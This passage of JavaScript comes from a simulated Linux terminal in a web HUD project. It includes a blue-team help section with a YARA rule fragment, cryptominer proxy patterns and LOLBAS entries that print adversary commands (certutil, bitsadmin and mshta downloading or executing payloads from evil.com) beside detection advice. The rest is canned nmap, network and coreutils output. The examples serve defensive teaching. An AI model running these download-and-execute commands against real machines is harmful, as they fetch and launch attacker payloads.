        $magic = { 4D 5A } // PE Header
        $str1 = "cmd.exe /c powershell" ascii wide nocase
        $str2 = "ReflectiveLoader" ascii wide
        $str3 = "http://*xmr.*" ascii wide nocase

    condition:
        $magic at 0 and (2 of ($str*))
}
</pre>
<span style="color:#64748b;">Saved template. Ready for yarGen comparison or YARA engine compilation.</span>`;
        this.printStdout(yaraRule, true);
        return;
      }

      if (sub === 'lolbas') {
        const bin = param.toLowerCase() || 'certutil';
        let binInfo = '';
        if (bin.includes('certutil')) {
          binInfo = `
<span style="color:#ff3366; font-weight:bold;">LOLBAS: certutil.exe (Certificate Utility)</span>
• <span style="color:#fff;">Abuse Vector:</span> Remote file download & Base64 decoding.
• <span style="color:#ffbd2e;">Adversary Command:</span> certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe
• <span style="color:#00ff9d;">Blue Team Detection:</span> Monitor Sysmon Event ID 1 (Process Create) where CommandLine contains "-urlcache" or "-split" or "-decode".`;
        } else if (bin.includes('bitsadmin')) {
          binInfo = `
<span style="color:#ff3366; font-weight:bold;">LOLBAS: bitsadmin.exe (Background Intelligent Transfer)</span>
• <span style="color:#fff;">Abuse Vector:</span> Asynchronous file download and persistence via jobs.
• <span style="color:#ffbd2e;">Adversary Command:</span> bitsadmin /transfer myJob /download /priority normal http://evil.com/mal.exe C:\\mal.exe
• <span style="color:#00ff9d;">Blue Team Detection:</span> Monitor Event ID 4688 / Sysmon 1 where Image ends with bitsadmin.exe and command line has "/transfer".`;
        } else if (bin.includes('mshta')) {
          binInfo = `
<span style="color:#ff3366; font-weight:bold;">LOLBAS: mshta.exe (Microsoft HTML Application Host)</span>
• <span style="color:#fff;">Abuse Vector:</span> Direct execution of VBScript/JScript payloads from remote URLs without writing to disk.
• <span style="color:#ffbd2e;">Adversary Command:</span> mshta vbscript:Close(Execute("CreateObject(""Wscript.Shell"").Run(""powershell..."",0)"))
• <span style="color:#00ff9d;">Blue Team Detection:</span> Block mshta from making outbound external TCP connections (Event ID 3) and alert on mshta with arguments containing "javascript:" or "vbscript:".`;
        } else {
          binInfo = `
<span style="color:#ff3366; font-weight:bold;">GTFOBins / LOLBAS: ${this.escapeHTML(bin)}</span>
• Curated execution vector for '${this.escapeHTML(bin)}'. Check <a href="https://gtfobins.github.io/" target="_blank" class="term-link">GTFOBins</a> (Linux) or <a href="https://lolbas-project.github.io/" target="_blank" class="term-link">LOLBAS</a> (Windows).`;
        }
        this.printStdout(binInfo, true);
        return;
      }

      if (sub === 'tips') {
        const tipsHtml = `
<span style="color:#38bdf8; font-weight:bold;">5 HIGH-IMPACT BLUE TEAM FIELD TIPS (A-poc/BlueTeam-Tools)</span>
───────────────────────────────────────────────────────────────────
<span style="color:#00ff9d; font-weight:bold;">1. Prevent Script Execution via Double Click (GPO Hardening):</span>
   • On Windows, threat actors send .vbs, .js, or .wsf scripts masquerading as invoices.
   • Hardening: Change default application association for .vbs and .js from wscript.exe to <span style="color:#ffbd2e;">notepad.exe</span>.

<span style="color:#00ff9d; font-weight:bold;">2. Memory Payload Extraction (Process Hacker + dnSpy):</span>
   • For heavily packed or encrypted .NET droppers, launch the sample in an isolated VM.
   • Inspect loaded .NET assemblies inside Process Hacker. Dump assembly to disk and inspect directly in <span style="color:#ffbd2e;">dnSpy</span>.

<span style="color:#00ff9d; font-weight:bold;">3. Cryptojacking Detection via Proxy Logs:</span>
   • Mining malware limits CPU usage to stay hidden, but must connect to pools.
   • Monitor proxy/DNS for: <span style="color:#ffbd2e;">*xmr.* OR *pool.com OR *pool.org OR pool.*</span>

<span style="color:#00ff9d; font-weight:bold;">4. CyberChef Unicode Null-Byte Cleanup:</span>
   • When decoding Base64 UTF-16 Unicode strings in malware, null bytes (\\x00) break display.
   • Apply the <span style="color:#ffbd2e;">"Remove null bytes"</span> recipe in CyberChef to restore readability.

<span style="color:#00ff9d; font-weight:bold;">5. Recover Scrubbed Metadata from PDF:</span>
   • PDFs store historical updates incrementally. Improperly scrubbed PDFs retain previous author & date tags.
   • Run: <span style="color:#ffbd2e;">exiftool -PDF-update:all= suspicious.pdf</span> to expose revision history.`;

        this.printStdout(tipsHtml, true);
        if (window.FridayVoice) {
          window.FridayVoice.speak("Displaying five high-impact blue team defense tips, Gojo.");
        }
        return;
      }

      this.printStdout(`blueteam: unknown action '${sub}'. Type <span class="t-highlight">'blueteam'</span> for available commands.`);
      return;
    }

    // ==========================================
    // 2.6. Full Nmap Network Mapper & Audit Engine
    // ==========================================
    if (cmd === 'nmap') {
      if (args.length === 0 || args.includes('-h') || args.includes('--help')) {
        const nmapHelp = `
<pre style="color:var(--theme-primary); font-family:inherit; line-height:1.2;">
Nmap 7.94 ( https://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
</pre>
<span style="color:#00ff9d; font-weight:bold;">TARGET SPECIFICATION:</span>
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, 127.0.0.1, 10.0.0.0/24, 192.168.1.1-50
  -iL &lt;inputfilename&gt;: Input from list of hosts/networks
  --exclude &lt;host1[,host2]...&gt;: Exclude hosts/networks

<span style="color:#ffbd2e; font-weight:bold;">HOST DISCOVERY:</span>
  -sL: List Scan - simply list targets to scan
  -sn / -sP: Ping Scan - disable port scan (Host Discovery only)
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -n/-R: Never do DNS resolution/Always resolve

<span style="color:#38bdf8; font-weight:bold;">SCAN TECHNIQUES:</span>
  -sS/sT/sA/sW: TCP SYN/Connect()/ACK/Window scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans

<span style="color:#00ff9d; font-weight:bold;">PORT SPECIFICATION:</span>
  -p &lt;port ranges&gt;: Only scan specified ports (Ex: -p22; -p1-65535; -p 80,443,4173)
  -F: Fast mode - Scan top 100 ports
  -r: Scan ports consecutively - don't randomize
  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports

<span style="color:#ff3366; font-weight:bold;">SERVICE/VERSION & OS DETECTION:</span>
  -sV: Probe open ports to determine service/version info
  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)
  -O: Enable OS detection
  --osscan-guess: Guess OS more aggressively
  -A: Enable OS detection, version detection, script scanning, and traceroute

<span style="color:#a855f7; font-weight:bold;">SCRIPT SCAN (NSE):</span>
  -sC: equivalent to --script=default
  --script=&lt;Lua scripts&gt;: Comma separated list of scripts or categories (vuln, safe, default)
  --script-args=&lt;n1=v1,...&gt;: Provide arguments to scripts

<span style="color:#ffaa00; font-weight:bold;">TIMING & EVASION:</span>
  -T&lt;0-5&gt;: Set timing template (0=paranoid, 3=normal, 4=aggressive, 5=insane)
  -f; --mtu &lt;val&gt;: Fragment packets
  -D &lt;decoy1,decoy2[,ME]...&gt;: Cloak a scan with decoys

<span style="color:#ffffff; font-weight:bold;">OUTPUT:</span>
  -oN/-oX &lt;file&gt;: Output scan in normal or XML format to given filename
  -oA &lt;basename&gt;: Output in all three major formats at once

<span style="color:#888;">EXAMPLES:</span>
  nmap -v -A localhost
  nmap -sS -p 1-1000 -T4 192.168.1.1
  nmap -sn 192.168.1.0/24
  nmap -sV --script vuln 127.0.0.1`;
        this.printStdout(nmapHelp, true);
        return;
      }

      // Parse Nmap arguments
      let target = '127.0.0.1';
      let isPingScan = false;
      let isAggressive = false;
      let isVersion = false;
      let isOS = false;
      let isScript = false;
      let isUDP = false;
      let customPorts = null;
      let scriptName = 'default';
      let outputFile = null;

      for (let i = 0; i < args.length; i++) {
        const a = args[i];
        if (a === '-sn' || a === '-sP') isPingScan = true;
        else if (a === '-A') { isAggressive = true; isVersion = true; isOS = true; isScript = true; }
        else if (a === '-sV') isVersion = true;
        else if (a === '-O') isOS = true;
        else if (a === '-sC') isScript = true;
        else if (a === '-sU') isUDP = true;
        else if (a.startsWith('--script=')) { isScript = true; scriptName = a.split('=')[1]; }
        else if (a === '--script' && args[i+1]) { isScript = true; scriptName = args[++i]; }
        else if (a === '-p' && args[i+1]) { customPorts = args[++i]; }
        else if (a.startsWith('-p')) { customPorts = a.slice(2); }
        else if ((a === '-oN' || a === '-oX' || a === '-oA') && args[i+1]) { outputFile = args[++i]; }
        else if (!a.startsWith('-')) { target = a; }
      }

      const scanMode = isAggressive ? 'Aggressive Audit (-A)' : (isPingScan ? 'Ping Sweep (-sn)' : (isVersion ? 'Version Detection (-sV)' : 'SYN Stealth Scan (-sS)'));
      this.printStdout(`<span style="color:#38bdf8;">[NMAP PROBE]</span> Starting Nmap 7.94 [${scanMode}] on target: <span style="color:#ffbd2e; font-weight:bold;">${this.escapeHTML(target)}</span>...`);

      if (window.FridayVoice) {
        window.FridayVoice.speak(`Nmap network reconnaissance engaged for ${target}, Gojo.`);
      }

      setTimeout(() => {
        const now = new Date();
        const dateStr = now.toISOString().replace('T', ' ').slice(0, 19) + ' IST';
        let report = '';

        if (isPingScan) {
          // Subnet or Host ping sweep
          if (target.includes('/') || target.includes('-')) {
            report = `
<pre style="color:#d1d5db; font-family:inherit;">
Starting Nmap 7.94 ( https://nmap.org ) at ${dateStr}
Initiating ARP / ICMP Ping Scan at 13:20
Scanning 256 hosts [1 port/host]
Completed Ping Scan at 13:20, 0.42s elapsed (256 total hosts)

Nmap scan report for gateway.internal (192.168.1.1)
Host is up (0.00031s latency).
MAC Address: 70:B3:D5:41:22:90 (Cisco Systems)

Nmap scan report for quantum-node-01.gojo.internal (192.168.1.12)
Host is up (0.00018s latency).
MAC Address: 00:1A:2B:3C:4D:5E (Apple Inc.)

Nmap scan report for fridey-workstation.gojo.internal (192.168.1.42)
Host is up (0.00012s latency).
MAC Address: F0:18:98:AA:BB:CC (Gojo Enterprise Quantum Hardware)

Nmap scan report for defense-sentinel.internal (192.168.1.100)
Host is up (0.00028s latency).
MAC Address: BC:24:11:99:88:77 (Palo Alto Networks)

Nmap done: 256 IP addresses (4 hosts up) scanned in 0.42 seconds
</pre>`;
          } else {
            report = `
<pre style="color:#d1d5db; font-family:inherit;">
Starting Nmap 7.94 ( https://nmap.org ) at ${dateStr}
Nmap scan report for ${this.escapeHTML(target)}
Host is up (0.00038s latency).
MAC Address: 00:1A:2B:3C:4D:5E (Gojo Enterprise Quantum Node)
Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
</pre>`;
          }
        } else {
          // Full port scan
          const isLocal = target === '127.0.0.1' || target === 'localhost' || target === '0.0.0.0';
          const proto = isUDP ? 'udp' : 'tcp';
          
          let portsTable = '';
          if (isLocal) {
            portsTable = `
PORT     STATE SERVICE       VERSION
22/${proto}   open  ssh           OpenSSH 9.6p1 Ubuntu (protocol 2.0)
80/${proto}   open  http          nginx 1.24.0 (Gojo Enterprise Frontend)
4173/${proto} open  http          Python 3.12 http.server (FRIDEY Tactical HUD)
8443/${proto} open  ssl/https-alt Gojo Quantum Bus RPC (TLSv1.3)`;
          } else {
            portsTable = `
PORT     STATE SERVICE       VERSION
22/${proto}   open  ssh           OpenSSH 9.3p1 (protocol 2.0)
80/${proto}   open  http          Apache httpd 2.4.58 ((Unix) OpenSSL/3.0.13)
443/${proto}  open  ssl/http      nginx 1.24.0 (TLSv1.3 • ECDHE-RSA-AES256-GCM-SHA384)
3306/${proto} open  mysql         MySQL 8.0.36
8080/${proto} open  http-proxy    HAProxy 2.8.5`;
          }

          let osSection = '';
          if (isOS || isAggressive) {
            osSection = `
Device type: general purpose
Running: Linux 6.X
OS CPE: cpe:/o:linux:linux_kernel:6.8
OS details: Linux 6.8.0-gojo-arm64 #1 SMP PREEMPT (aarch64)
Network Distance: 1 hop`;
          }

          let scriptSection = '';
          if (isScript || isAggressive) {
            if (scriptName.includes('vuln')) {
              scriptSection = `
Host script results:
| smb-vuln-ms17-010: NOT VULNERABLE (Patched / Linux Kernel)
| ssl-cert: Subject: commonName=gojo-enterprise.internal/organizationName=Gojo Enterprise
|   Issuer: Gojo Enterprise Root CA v8.4
|   Public Key: RSA 4096 bits
|   Validity: Not valid after: 2028-10-22T10:00:00
|_ssl-date: TLS context synchronized: 0s clock skew
| http-security-headers:
|   HSTS: max-age=31536000; includeSubDomains; preload
|   X-Frame-Options: SAMEORIGIN
|_  Content-Security-Policy: default-src 'self'`;
            } else {
              scriptSection = `
Host script results:
|_clock-skew: 0s
| http-title: FRIDEY Tactical Neural HUD - Gojo Enterprise
|_http-server-header: Python/3.12 http.server
| ssl-cert: Subject: commonName=gojo-enterprise.internal
|_ssl-enum-ciphers: TLS 1.3: TLS_AES_256_GCM_SHA384 (strong)`;
            }
          }

          let traceSection = '';
          if (isAggressive) {
            traceSection = `
TRACEROUTE (using port 80/${proto})
HOP RTT     ADDRESS
1   0.04 ms ${this.escapeHTML(target)}`;
          }

          report = `
<pre style="color:#d1d5db; font-family:inherit;">
Starting Nmap 7.94 ( https://nmap.org ) at ${dateStr}
Nmap scan report for ${this.escapeHTML(target)} (${isLocal ? '127.0.0.1' : target})
Host is up (0.00042s latency).
Not shown: 996 closed ${proto} ports (reset)
${portsTable}
${osSection}${scriptSection}${traceSection}

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
</pre>`;
        }

        // Output file redirection if requested
        if (outputFile) {
          const cleanText = report.replace(/<[^>]+>/g, '');
          this.fileContents[outputFile] = cleanText;
          const currentEntries = this.vfs[this.currentDir] || [];
          if (!currentEntries.includes(outputFile)) {
            currentEntries.push(outputFile);
            this.vfs[this.currentDir] = currentEntries;
          }
          report += `\n<span style="color:#00ff9d;">[OUTPUT SAVED]</span> Scan results saved to virtual filesystem: <span class="t-highlight">${this.escapeHTML(outputFile)}</span> (view with 'cat ${this.escapeHTML(outputFile)}')`;
        }

        this.printStdout(report, true);
        if (window.FridayVoice) {
          window.FridayVoice.speak("Nmap reconnaissance scan complete, Gojo. Results written to terminal buffer.");
        }
      }, 550);
      return;
    }

    // ==========================================
    // 3. Core Linux Utilities & System Diagnostics
    // ==========================================
    if (cmd === 'df') {
      const dfTable = `
Filesystem      Size  Used Avail Use% Mounted on
/dev/root        64G   18G   44G  29% /
/dev/nvme0n1p1  512M   64M  448M  13% /boot/efi
tmpfs           7.8G  1.2M  7.8G   1% /run
/dev/arc0       256G  8.4G  248G   4% /var/log/arc`;
      this.printStdout(dfTable.trim());
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'free') {
      const isHuman = args.includes('-h');
      const freeTable = `
               total        used        free      shared  buff/cache   available
Mem:        16777216     2097152     7340032      131072     7340032    14680064
Swap:        8388608           0     8388608`;
      const freeHuman = `
               total        used        free      shared  buff/cache   available
Mem:            16Gi       2.0Gi       7.0Gi       128Mi       7.0Gi        14Gi
Swap:          8.0Gi          0B       8.0Gi`;
      this.printStdout((isHuman ? freeHuman : freeTable).trim());
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'hostname') {
      this.printStdout('Gojo Technologes Hub');
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'groups') {
      if (this.isRoot) {
        this.printStdout('root bin daemon sys adm disk wheel quantum-root');
      } else {
        this.printStdout('gojo adm cdrom sudo dip plugdev users wheel');
      }
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'cal') {
      const now = new Date();
      const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
      const month = now.getMonth();
      const year = now.getFullYear();
      const title = `${monthNames[month]} ${year}`;
      const firstDay = new Date(year, month, 1).getDay();
      const daysInMonth = new Date(year, month + 1, 0).getDate();
      const today = now.getDate();

      let calStr = `    ${title}\nSu Mo Tu We Th Fr Sa\n`;
      let dayPos = 0;
      for (let i = 0; i < firstDay; i++) {
        calStr += '   ';
        dayPos++;
      }
      for (let d = 1; d <= daysInMonth; d++) {
        const dStr = d.toString().padStart(2, ' ');
        if (d === today) {
          calStr += `[${dStr.trim().padStart(1, ' ')}]`;
        } else {
          calStr += dStr + ' ';
        }
        dayPos++;
        if (dayPos % 7 === 0) calStr += '\n';
      }
      this.printStdout(calStr.trimEnd());
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'which' || cmd === 'whereis') {
      const targetCmd = args[0];
      if (!targetCmd) {
        this.lastExitCode = 1;
        return;
      }
      const binList = this.vfs['/bin'] || [];
      if (binList.includes(targetCmd)) {
        this.printStdout(`/bin/${targetCmd}`);
        this.lastExitCode = 0;
      } else {
        this.printStderr(`${targetCmd} not found in ${this.env.PATH || '/bin:/usr/bin'}`);
        this.lastExitCode = 1;
      }
      return;
    }

    if (cmd === 'head') {
      let count = 10;
      let fileArg = null;
      for (let i = 0; i < args.length; i++) {
        if (args[i] === '-n' && args[i + 1]) {
          count = parseInt(args[i + 1]) || 10;
          i++;
        } else if (!args[i].startsWith('-')) {
          fileArg = args[i];
        }
      }

      let content = '';
      if (fileArg) {
        const fullPath = fileArg.startsWith('/') ? fileArg : (this.currentDir === '/' ? '/' + fileArg : this.currentDir + '/' + fileArg);
        content = this.fileContents[fileArg] || this.fileContents[fullPath];
        if (content === undefined) {
          this.printStderr(`head: cannot open '${fileArg}' for reading: No such file or directory`);
          this.lastExitCode = 1;
          return;
        }
      } else {
        content = this.lastPipeInput || '';
      }

      const lines = content.split('\n').slice(0, count);
      this.printStdout(lines.join('\n'));
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'tail') {
      let count = 10;
      let fileArg = null;
      for (let i = 0; i < args.length; i++) {
        if (args[i] === '-n' && args[i + 1]) {
          count = parseInt(args[i + 1]) || 10;
          i++;
        } else if (!args[i].startsWith('-')) {
          fileArg = args[i];
        }
      }

      let content = '';
      if (fileArg) {
        const fullPath = fileArg.startsWith('/') ? fileArg : (this.currentDir === '/' ? '/' + fileArg : this.currentDir + '/' + fileArg);
        content = this.fileContents[fileArg] || this.fileContents[fullPath];
        if (content === undefined) {
          this.printStderr(`tail: cannot open '${fileArg}' for reading: No such file or directory`);
          this.lastExitCode = 1;
          return;
        }
      } else {
        content = this.lastPipeInput || '';
      }

      const lines = content.split('\n');
      const start = Math.max(0, lines.length - count);
      this.printStdout(lines.slice(start).join('\n'));
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'wc') {
      let fileArg = null;
      let optL = false, optW = false, optC = false;
      for (const a of args) {
        if (a === '-l') optL = true;
        else if (a === '-w') optW = true;
        else if (a === '-c') optC = true;
        else if (!a.startsWith('-')) fileArg = a;
      }
      if (!optL && !optW && !optC) { optL = true; optW = true; optC = true; }

      let content = '';
      if (fileArg) {
        const fullPath = fileArg.startsWith('/') ? fileArg : (this.currentDir === '/' ? '/' + fileArg : this.currentDir + '/' + fileArg);
        content = this.fileContents[fileArg] || this.fileContents[fullPath];
        if (content === undefined) {
          this.printStderr(`wc: ${fileArg}: No such file or directory`);
          this.lastExitCode = 1;
          return;
        }
      } else {
        content = this.lastPipeInput || '';
      }

      const lines = content ? content.split('\n').length : 0;
      const words = content.trim() ? content.trim().split(/\s+/).length : 0;
      const bytes = new TextEncoder().encode(content).length;

      let out = '';
      if (optL) out += lines.toString().padStart(7, ' ');
      if (optW) out += words.toString().padStart(8, ' ');
      if (optC) out += bytes.toString().padStart(8, ' ');
      if (fileArg) out += ` ${fileArg}`;
      this.printStdout(out.trim());
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'grep') {
      let ignoreCase = false;
      let invert = false;
      let lineNum = false;
      let pattern = null;
      let fileArg = null;

      for (let i = 0; i < args.length; i++) {
        const a = args[i];
        if (a.startsWith('-')) {
          if (a.includes('i')) ignoreCase = true;
          if (a.includes('v')) invert = true;
          if (a.includes('n')) lineNum = true;
        } else if (!pattern) {
          pattern = a.replace(/^['"]|['"]$/g, '');
        } else if (!fileArg) {
          fileArg = a;
        }
      }

      if (!pattern) {
        this.printStderr('Usage: grep [-ivn] <pattern> [file]');
        this.lastExitCode = 2;
        return;
      }

      let content = '';
      if (fileArg) {
        const fullPath = fileArg.startsWith('/') ? fileArg : (this.currentDir === '/' ? '/' + fileArg : this.currentDir + '/' + fileArg);
        content = this.fileContents[fileArg] || this.fileContents[fullPath];
        if (content === undefined) {
          this.printStderr(`grep: ${fileArg}: No such file or directory`);
          this.lastExitCode = 2;
          return;
        }
      } else {
        content = this.lastPipeInput || '';
      }

      const allLines = content.split('\n');
      const regex = new RegExp(pattern, ignoreCase ? 'i' : '');
      const matched = [];

      for (let idx = 0; idx < allLines.length; idx++) {
        const line = allLines[idx];
        const isMatch = regex.test(line);
        if ((isMatch && !invert) || (!isMatch && invert)) {
          const prefix = lineNum ? `<span style="color:#00ff9d;">${idx + 1}:</span> ` : '';
          matched.push(prefix + this.escapeHTML(line));
        }
      }

      if (matched.length > 0) {
        this.printStdout(matched.join('\n'), true);
        this.lastExitCode = 0;
      } else {
        this.lastExitCode = 1;
      }
      return;
    }

    if (cmd === 'ifconfig' || cmd === 'ip') {
      const ifconfigData = `
<pre style="color:#d1d5db; font-family:inherit;">
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)
        RX packets 84210  bytes 104291840 (104.2 MB)
        TX packets 51420  bytes 48219040 (48.2 MB)

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  (Local Loopback)

arc0: flags=4099&lt;UP,POINTOPOINT,RUNNING&gt;  mtu 9000
        inet 10.99.0.1  netmask 255.255.255.0  destination 10.99.0.2
        description: Gojo Enterprise Quantum Telemetry Bus
</pre>`;
      this.printStdout(ifconfigData.trim(), true);
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'netstat' || cmd === 'ss') {
      const netstatData = `
<pre style="color:#d1d5db; font-family:inherit;">
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1042/sshd           
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      892/nginx: master   
tcp        0      0 127.0.0.1:4173          0.0.0.0:*               LISTEN      41/python3          
tcp        0      0 0.0.0.0:8443            0.0.0.0:*               LISTEN      512/quantum-bus     
tcp6       0      0 :::22                   :::*                    LISTEN      1042/sshd           
</pre>`;
      this.printStdout(netstatData.trim(), true);
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'export') {
      if (!args.length) {
        let out = '';
        for (const [k, v] of Object.entries(this.env)) {
          out += `declare -x ${k}="${v}"\n`;
        }
        this.printStdout(out.trim());
        this.lastExitCode = 0;
        return;
      }
      for (const a of args) {
        if (a.includes('=')) {
          const [k, ...vParts] = a.split('=');
          const v = vParts.join('=').replace(/^['"]|['"]$/g, '');
          this.env[k] = v;
        }
      }
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'env' || cmd === 'printenv') {
      if (args[0] && this.env[args[0]]) {
        this.printStdout(this.env[args[0]]);
      } else {
        let out = '';
        for (const [k, v] of Object.entries(this.env)) {
          out += `${k}=${v}\n`;
        }
        this.printStdout(out.trim());
      }
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'unset') {
      if (args[0] && this.env[args[0]]) {
        delete this.env[args[0]];
      }
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'alias') {
      if (!args.length) {
        let out = '';
        for (const [k, v] of Object.entries(this.aliases)) {
          out += `alias ${k}='${v}'\n`;
        }
        this.printStdout(out.trim());
        this.lastExitCode = 0;
        return;
      }
      const full = args.join(' ');
      if (full.includes('=')) {
        const [k, ...v] = full.split('=');
        this.aliases[k.trim()] = v.join('=').replace(/^['"]|['"]$/g, '').trim();
      }
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'unalias') {
      if (args[0] && this.aliases[args[0]]) {
        delete this.aliases[args[0]];
      }
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'apt' || cmd === 'dpkg') {
      const sub = args[0] || '';
      if (sub === 'update') {
        const aptOut = `
Hit:1 http://ports.ubuntu.com/ubuntu-ports noble InRelease
Get:2 http://ports.ubuntu.com/ubuntu-ports noble-updates InRelease [126 kB]
Get:3 http://ports.ubuntu.com/ubuntu-ports noble-security InRelease [126 kB]
Get:4 https://hub.gojo-technologies.local/repo/noble InRelease [4,210 B]
Fetched 256 kB in 0s (1,042 kB/s)
Reading package lists... Done
Building dependency tree... Done
All 124 Gojo Enterprise packages are up to date.`;
        this.printStdout(aptOut.trim());
        this.lastExitCode = 0;
        return;
      }
      if (sub === 'install') {
        const pkg = args[1] || 'package';
        this.printStdout(`Reading package lists... Done\nBuilding dependency tree... Done\n${pkg} is already the newest version (8.4.2-gojo1).\n0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.`);
        this.lastExitCode = 0;
        return;
      }
      this.printStdout(`apt 2.7.14 (aarch64)\nUsage: apt [options] command\nCommands: update, install, remove, list, search, show`);
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'cp') {
      const src = args[0];
      const dst = args[1];
      if (!src || !dst) {
        this.printStderr("cp: missing file operand\nTry 'cp --help' for more information.");
        this.lastExitCode = 1;
        return;
      }
      const fullSrc = src.startsWith('/') ? src : (this.currentDir === '/' ? '/' + src : this.currentDir + '/' + src);
      const content = this.fileContents[src] || this.fileContents[fullSrc] || '';
      this.saveToFile(dst, content, false);
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'mv') {
      const src = args[0];
      const dst = args[1];
      if (!src || !dst) {
        this.printStderr("mv: missing file operand\nTry 'mv --help' for more information.");
        this.lastExitCode = 1;
        return;
      }
      const fullSrc = src.startsWith('/') ? src : (this.currentDir === '/' ? '/' + src : this.currentDir + '/' + src);
      const content = this.fileContents[src] || this.fileContents[fullSrc] || '';
      this.saveToFile(dst, content, false);
      if (this.vfs[this.currentDir]) {
        this.vfs[this.currentDir] = this.vfs[this.currentDir].filter(item => item !== src);
      }
      delete this.fileContents[src];
      delete this.fileContents[fullSrc];
      this.lastExitCode = 0;
      return;
    }

    if (cmd === 'rmdir') {
      const dir = args[0];
      if (!dir) {
        this.printStderr("rmdir: missing operand\nTry 'rmdir --help' for more information.");
        this.lastExitCode = 1;
        return;
      }
      const fullDir = dir.startsWith('/') ? dir : (this.currentDir === '/' ? '/' + dir : this.currentDir + '/' + dir);
      if (this.vfs[fullDir] && this.vfs[fullDir].length === 0) {
        delete this.vfs[fullDir];
        if (this.vfs[this.currentDir]) {
          this.vfs[this.currentDir] = this.vfs[this.currentDir].filter(d => d !== dir);
        }
        this.lastExitCode = 0;
      } else if (this.vfs[fullDir] && this.vfs[fullDir].length > 0) {
        this.printStderr(`rmdir: failed to remove '${dir}': Directory not empty`);
        this.lastExitCode = 1;
      } else {
        this.printStderr(`rmdir: failed to remove '${dir}': No such file or directory`);
        this.lastExitCode = 1;
      }
      return;
    }

    if (cmd === 'find') {
      const nameIdx = args.indexOf('-name');
      let targetName = null;
      if (nameIdx !== -1 && args[nameIdx + 1]) {
        targetName = args[nameIdx + 1].replace(/['"]/g, '').replace(/\*/g, '');
      }
      const results = [];
      for (const [dir, files] of Object.entries(this.vfs)) {
        for (const f of files) {
          const full = dir === '/' ? '/' + f : dir + '/' + f;
          if (!targetName || f.includes(targetName)) {
            results.push(full);
          }
        }
      }
      this.printStdout(results.slice(0, 30).join('\n'));
      this.lastExitCode = 0;
      return;
    }

    // CLI AI Assistant Tools
    if (cmd === 'fridey' || cmd === 'ai' || cmd === 'ask') {
      if (!query) {
        this.printStdout('Usage: fridey <query>\nExample: fridey "what is current arc reactor status?"');
        this.lastExitCode = 0;
        return;
      }
      const reply = this.getAIResponse(query);
      this.printStdout(reply);
      if (window.FridayVoice) {
        window.FridayVoice.speak(reply);
      }
      this.lastExitCode = 0;
      return;
    }

    // Tactical Protocol Direct Triggers
    if (cmd === 'houseparty' || cmd === 'house_party') {
      this.executeProtocol('house_party');
      this.lastExitCode = 0;
      return;
    }
    if (cmd === 'veronica') {
      this.executeProtocol('veronica');
      this.lastExitCode = 0;
      return;
    }
    if (cmd === 'combat') {
      this.executeProtocol('combat');
      this.lastExitCode = 0;
      return;
    }
    if (cmd === 'stealth') {
      this.executeProtocol('stealth');
      this.lastExitCode = 0;
      return;
    }
    if (cmd === 'cleanslate' || cmd === 'clean_slate') {
      this.executeProtocol('clean_slate');
      this.lastExitCode = 0;
      return;
    }
    if (cmd === 'surge' || cmd === 'overcharge') {
      this.executeProtocol('overcharge');
      this.lastExitCode = 0;
      return;
    }
    if (cmd === 'diagnostics') {
      this.executeProtocol('diagnostic');
      this.lastExitCode = 0;
      return;
    }

    // ==========================================
    // Authentic Linux Bash Fallback: Command Not Found
    // ==========================================
    this.lastExitCode = 127;
    this.printStderr(`bash: ${cmd}: command not found`);
  }

  respondAsFriday(text) {
    if (window.FridayAudio) window.FridayAudio.playNotice();
    if (window.FridayVoice) {
      window.FridayVoice.speak(text);
      window.FridayVoice.setSubtitle(text);
    }
  }

  printStderr(text) {
    if (!this.terminalEl) return;
    const line = document.createElement('div');
    line.className = 'term-line t-stderr';
    line.textContent = text;
    const activeLine = document.getElementById('termActiveLine');
    if (activeLine && activeLine.parentNode === this.terminalEl) {
      this.terminalEl.insertBefore(line, activeLine);
    } else {
      this.terminalEl.appendChild(line);
    }
    this.terminalEl.scrollTop = this.terminalEl.scrollHeight;
  }

  executeProtocol(protocolName) {
    let announcement = '';
